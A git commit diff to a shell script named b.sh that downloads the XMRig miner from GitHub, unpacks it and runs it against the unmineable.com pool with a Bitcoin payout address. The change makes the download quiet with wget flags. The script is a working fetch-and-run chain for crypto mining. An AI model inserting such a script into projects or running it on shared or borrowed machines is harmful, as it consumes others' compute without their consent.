b897eb8fe297a48ee1e08ef009e5066a2313fce2
dangnguyentran <90539322+dangnguyentran@users.noreply.github.com>
2021-09-19 20:06:47 +0700

    Update b.sh

--- b.sh
+++ b.sh
@@ -1,5 +1,5 @@
 #!/bin/sh
-wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+wget -q -c -nc https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
 tar -xf xmrig-6.15.0-linux-static-x64.tar.gz
 cd xmrig-6.15.0
 ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:1HjnNAPQWjgRt7RWCCEjyqBz1ZFFfVvVeQ.THDN1#0r73-ojtu -p x pause 
